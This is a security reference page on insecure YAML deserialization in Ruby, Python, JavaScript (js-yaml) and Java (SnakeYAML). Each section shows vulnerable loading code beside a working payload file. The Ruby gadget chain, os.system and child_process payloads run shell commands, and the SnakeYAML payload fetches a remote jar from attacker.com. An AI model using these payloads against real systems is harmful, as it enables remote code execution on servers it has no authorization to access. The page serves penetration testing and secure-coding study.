---
description: Yet Another Markup Language
---

# YAML

## Description

First of all, this great article explains all sorts of tricks and weirdness in YAML:

{% embed url="https://ruudvanasseldonk.com/2023/01/11/the-yaml-document-from-hell" %}
Explanation and examples of many YAML tricks
{% endembed %}

## Insecure Deserialization

In YAML the `!` character can mean a **tag**, which allows you to execute a function in the host language with a parameter that comes right after (because why not). Many parsers implement this as it is required by the spec, but if attackers have control over the YAML file, even partially, they can use these tags to run arbitrary functions with arbitrary arguments.&#x20;

A common target for this is a function that executes shell commands, where you can gain Remote Code Execution. The following examples all execute the `id` command and allow you to execute any arbitrary commands:

### Ruby

{% code title="Vulnerable Code" %}
```ruby
require "yaml"

YAML.load(File.read("data.yml"))
```
{% endcode %}

#### Payload (>2.7, [source](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/))

{% code title="data.yml" %}
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "id"
         method_id: :resolve
```
{% endcode %}

### Python

{% code title="Vulnerable Code" %}
```python
from yaml import Loader, load

deserialized = load(open('data.yml'), Loader=Loader)
```
{% endcode %}

#### Payload

{% code title="data.yml" %}
```yaml
!!python/object/apply:os.system
- "id"
```
{% endcode %}

### JavaScript - `js-yaml` (<4.0)

This popular JavaScript library allows the creation of arbitrary functions like `.toString()` which can be called accidentally, when using `load()` instead of `safeLoad()` in versions below 4:

{% code title="Vulnerable Code" %}
```javascript
const yaml = require('js-yaml');
const fs = require('fs');

const res = yaml.load(fs.readFileSync('data.yml'));
console.log(res + "")  // Calls .toString() as trigger
```
{% endcode %}

#### Payloads

{% code title="data.yml" %}
```yaml
"toString": !<tag:yaml.org,2002:js/function> "function (){console.log(process.mainModule.require('child_process').execSync('id').toString())}"
```
{% endcode %}

{% code title="data.yml" %}
```yaml
toString: !!js/function >
  function () {
      console.log(process.mainModule.require('child_process').execSync('id').toString())
  }
```
{% endcode %}

### Java - SnakeYAML (<2.0)

{% embed url="https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471" %}
Walkthrough of vulnerability as theory and exploitability
{% endembed %}

{% code title="Vulnerable Code" %}
```java
import org.yaml.snakeyaml.Yaml;

Yaml yaml = new Yaml();
FileInputStream fis = new FileInputStream("data.yml");
Map<String, Object> parsed = yaml.load(fis);
```
{% endcode %}

#### Payload

{% code title="data.yml" %}
```yaml
some_var: !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
        !!java.net.URL ["http://attacker.com/payload.jar"]
    ]]
]
```
{% endcode %}

`/payload.jar` file:

1. [Explanation](https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471) (search "remote jar file")
2. [Proof of Concept](https://github.com/jordyv/poc-snakeyaml) with `build.sh` script (change [`exec()`](https://github.com/jordyv/poc-snakeyaml/blob/master/src/pocsnakeyaml/PocScriptEngineFactory.java#L18))
